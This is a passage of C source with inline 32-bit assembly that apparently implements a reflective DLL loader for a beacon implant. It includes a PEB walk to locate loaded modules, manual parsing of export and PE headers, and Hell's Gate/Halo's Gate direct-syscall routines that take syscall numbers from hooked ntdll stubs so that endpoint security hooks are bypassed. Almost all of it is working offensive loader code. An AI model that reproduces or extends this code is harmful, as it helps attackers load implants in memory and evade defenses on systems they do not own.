            syscallNumber = (DWORD)(ULONG_PTR)halosGateDown(functionAddress, (void*)(ULONG_PTR)index);
            if (syscallNumber) {
                syscallNumber = syscallNumber + index;
                break;
            }
        }
    }
    return syscallNumber;
}
#endif

__asm__(
"getRdllBase: \n"
    "call pop \n"                  // Calling the next instruction puts RIP address on the top of our stack
    "pop: \n"
    "pop ecx \n"                   // pop RIP into RCX
"dec1: \n"
    "mov ebx, 0x5A4D \n"            // "MZ" bytes for comparing if we are at the start of our reflective DLL
"dec2: \n"
    "dec ecx \n"
    "cmp bx, word ptr ds:[ecx] \n" // Compare the first 2 bytes of the page to "MZ"
    "jne dec2 \n"
    "xor eax, eax \n"
    "mov ax, [ecx+0x3C] \n"        // IMAGE_DOS_HEADER-> LONG   e_lfanew;  // File address of new exe header
    "add eax, ecx \n"              // DLL base + RVA new exe header = 0x00004550 PE00 Signature
    "mov ebx, 0x4550 \n"             // PEOO
    "cmp bx, word ptr ds:[eax] \n" // Compare the 4 bytes to PE\0\0
    "jne dec1 \n"
    "mov eax, ecx \n"              // Return the base address of our reflective DLL
    "ret \n"                       // return initRdllAddr
"getDllBase: \n"
    "mov ecx, [esp+0x4] \n"        // load the first param in ecx
    "mov ecx, [ecx] \n"            // First 4 bytes of string
"getMemList: \n"
    "mov ebx, fs:[0x30] \n"        // ProcessEnvironmentBlock // FS = TEB
    "mov ebx, [ebx+0x0c] \n"       // _PEB_LDR_DATA
    "mov ebx, [ebx+0x14] \n"       // InMemoryOrderModuleList - First Entry (probably the host PE File)
    "mov edx, ebx \n"
"crawl: \n"
    "mov eax, [ebx+0x28] \n"       // BaseDllName Buffer
    "mov eax, [eax] \n"            // First 4 Unicode bytes of the DLL string from the Ldr List // TODO: this check in 32 bits sucks (even more)
    "cmp eax, ecx \n"
    "je found \n"
    "mov ebx, [ebx] \n"            // InMemoryOrderLinks Next Entry
    "cmp edx, [ebx] \n"            // Are we back at the same entry in the list?
    "jne crawl \n"
    "xor eax, eax \n"              // DLL is not in InMemoryOrderModuleList, return NULL
    "jmp end \n"
"found: \n"
    "mov eax, [ebx+0x10] \n"       // DllBase Address in process memory
"end: \n"
    "ret \n"
"getExportDirectory: \n"
    "mov eax, [esp+0x4] \n"    // dllAddr
    "mov ebx, [eax+0x3C] \n"   // e_lfanew
    "add ebx, eax \n"          // NtHeader
    "mov edx, [ebx+0x78] \n"   // RVA to ExportDirectory
    "add eax, edx \n"          // ExportDirectory
    "ret \n" // return ExportDirectory
"getExportAddressTable: \n"
    "mov ecx, [esp+0x4] \n"    // dllAddr
    "mov edx, [esp+0x8] \n"    // dllExportDirectory
    "add edx, 0x1C \n"         // DWORD AddressOfFunctions; // 0x1C offset // EDX = &RVAExportAddressTable
    "mov eax, [edx] \n"        // RVAExportAddressTable (Value/RVA)
    "add eax, ecx \n"          // VA ExportAddressTable (The address of the Export table in running memory of the process)
    "ret \n" // return ExportAddressTable
"getExportNameTable: \n"
    "mov ecx, [esp+0x4] \n"    // dllAddr
    "mov edx, [esp+0x8] \n"    // dllExportDirectory
    "add edx, 0x20 \n"         // DWORD AddressOfNames; // 0x20 offset
    "mov eax, [edx] \n"        // RVAExportAddressOfNames (Value/RVA)
    "add eax, ecx \n"          // VA ExportAddressOfNames
    "ret \n" // return ExportNameTable;
"getExportOrdinalTable: \n"
    "mov ecx, [esp+0x4] \n"    // dllAddr
    "mov edx, [esp+0x8] \n"    // dllExportDirectory
    "add edx, 0x24 \n"         // DWORD AddressOfNameOrdinals; // 0x24 offset
    "mov eax, [edx] \n"        // RVAExportAddressOfNameOrdinals (Value/RVA)
    "add eax, ecx \n"          // VA ExportAddressOfNameOrdinals
    "ret \n" // return ExportOrdinalTable;
"getSymbolAddress: \n"
    "mov edx, [esp+0x14] \n"    // ExportNameTable
    "xor eax, eax \n"
"lFindSym: \n"
    "mov ecx, [esp+0x8] \n"    // DWORD symbolStringSize (Reset string length counter for each loop)
    "mov edi, [edx+eax*4] \n"  // RVA NameString = [&NamePointerTable + (Counter * 4)]
    "add edi, [esp+0xc] \n"    // &NameString    = RVA NameString + &module.dll
    "mov esi, [esp+0x4] \n"    // Address of API Name String to match on the Stack (reset to start of string)
    "repe cmpsb \n"            // Compare strings at RDI & RSI
    "je FoundSym \n"           // If match then we found the API string. Now we need to find the Address of the API
    "inc eax \n"               // Increment to check if the next name matches
    "jmp short lFindSym \n"    // Jump back to start of loop
"FoundSym: \n"
    "mov ebx, [esp+0x18] \n"   // ExportOrdinalTable
    "mov ax, [ebx+eax*2] \n"   // [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
    "mov ebx, [esp+0x10] \n"   // AddressTable
    "mov eax, [ebx+eax*4] \n"  // RVA API = [&AddressTable + API OrdinalNumber]
    "mov ebx, [esp+0xc] \n"    // dllBase
    "add eax, ebx \n"          // module.<API> = RVA module.<API> + module.dll BaseAddress
    "mov ebx, [esp+0xc] \n"    // dllBase
    "mov ebx, [esp+0x18] \n"   // ExportOrdinalTable
    "sub ebx, eax \n"          // See if our symbol address is greater than the OrdinalTable Address. If so its a forwarder to a different API
    "jns notForwarder \n"      // If forwarder, result will be negative and Sign Flag is set (SF), jump not sign = jns
    "xor eax, eax \n"          // If forwarder, return 0x0 and exit
"notForwarder: \n"
    "ret \n"
"getNewExeHeader: \n"
    "mov ecx, [esp+0x4] \n"    // dllBase
    "mov eax, [ecx+0x3C] \n"   // Offset NewEXEHeader
    "add eax, ecx \n"          // &module.dll + Offset NewEXEHeader = &NewEXEHeader
    "ret \n" // return NewExeHeader;
"getDllSize: \n"
    "mov ecx, [esp+0x4] \n"    // newExeHeader
    "mov ebx, [ecx+0x50] \n"   // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfImage
    "mov eax, ebx \n"
    "ret \n" // return dllSize;
"getDllSizeOfHeaders: \n"
    "mov ecx, [esp+0x4] \n"    // newExeHeader
    "mov ebx, [eax+0x54] \n"   // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfHeaders
    "mov eax, ebx \n"
    "ret \n" // return SizeOfHeaders;
"copyMemory: \n"
    "mov ecx, [esp+0x4] \n"    // Size
    "mov edx, [esp+0x8] \n"    // source
    "mov eax, [esp+0xc] \n"    // destination
    "test ecx, ecx \n"         // check if ecx = 0
    "jne copy1 \n"             // if ecx == 0, ret
    "ret \n"
"copy1: \n"
    "dec ecx \n"               // Decrement the counter
    "mov bl, [edx] \n"         // Load the next byte to write into the BL register
    "mov [eax], bl \n"         // write the byte
    "inc edx \n"               // move edx to next byte of source
    "inc eax \n"               // move eax to next byte of destination
    "test ecx, ecx \n"         // check if ecx = 0
    "jne copy1 \n"             // if ecx != 0, then write next byte via loop
    "ret \n"
"getOptionalHeader: \n"
    "mov eax, [esp+0x4] \n"     // NewExeHeader
    "add eax, 0x18 \n"
    "ret \n" // return OptionalHeader
"getSizeOfOptionalHeader: \n"
    "mov ecx, [esp+0x4] \n"     // NewExeHeader
    "add ecx, 0x14 \n"          // &FileHeader.SizeOfOptionalHeader
    "xor ebx, ebx \n"
    "mov bx, [ecx] \n"          // Value of FileHeader.SizeOfOptionalHeader
    "mov eax, ebx \n"
    "ret \n"
"add: \n"
    "mov eax, [esp+0x4] \n"    // Num1
    "mov ebx, [esp+0x8] \n"    // Num2
    "add eax, ebx \n"
    "ret \n"
"getNumberOfSections: \n"
    "mov ecx, [esp+0x4] \n"     // newExeHeaderAddr
    "add ecx, 0x6 \n"           // &FileHeader.NumberOfSections
    "xor eax, eax \n"
    "mov ax, [ecx] \n"
    "ret \n"
"getBeaconEntryPoint: \n"
    "mov ecx, [esp+0x4] \n"     // newRdllAddr
    "mov edx, [esp+0x8] \n"     // OptionalHeaderAddr
    "add edx, 0x10 \n"          // OptionalHeader.AddressOfEntryPoint
    "mov eax, [edx] \n"
    "add eax, ecx \n"           // newRdllAddr.EntryPoint
    "ret \n" // return newRdllAddrEntryPoint
);

#ifdef SYSCALLS
__asm__(
"findSyscallNumber: \n"
    "mov ecx, [esp+0x4] \n"     // ntdllApiAddr
    "mov bl, [ecx] \n"          // byte at offset 0
    "cmp bl, 0xB8 \n"           // check it is 0xb8
    "jne error \n"
    "mov bl, [ecx+0x3] \n"      // byte at offset 3
    "cmp bl, 0x0 \n"            // check it is 0x0
    "jne error \n"
    "mov bl, [ecx+0x4] \n"      // byte at offset 4
    "cmp bl, 0x0 \n"            // check it is 0x0
    "jne error \n"
    "xor eax, eax \n"
    "mov ax, [ecx+0x1] \n"
    "ret \n"
"error: \n"
    "xor eax, eax \n"
    "ret \n"
"halosGateUp: \n"
    "xor esi, esi \n"
    "xor edi, edi \n"
    "mov esi, 0xB8D18B4C \n"
    "xor eax, eax \n"
    "mov al, 0x20 \n"
    "mul dx \n"
    "add ecx, eax \n"
    "mov edi, [ecx] \n"
    "cmp esi, edi \n"
    "jne error \n"
    "xor eax, eax \n"
    "mov ax, [ecx+4] \n"
    "ret \n"
"halosGateDown: \n"
    "xor esi, esi \n"
    "xor edi, edi \n"
    "mov esi, 0xB8D18B4C \n"
    "xor eax, eax \n"
    "mov al, 0x20 \n"
    "mul dx \n"
    "sub ecx, eax \n"
    "mov edi, [ecx] \n"
    "cmp esi, edi \n"
    "jne error \n"
    "xor eax,eax \n"
    "mov ax, [ecx+4] \n"
    "ret \n"
"HellsGate: \n"
    "mov edi, [esp+0x4] \n" // store the syscall number in edi, lets hope is not used!
    "ret \n"
"HellDescent: \n"
    "mov eax, edi \n"
    "call DoSysenter \n"
    "ret \n"
"DoSysenter: \n"
    "mov edx, esp \n"
    "sysenter \n"
    "ret \n"
);
#endif
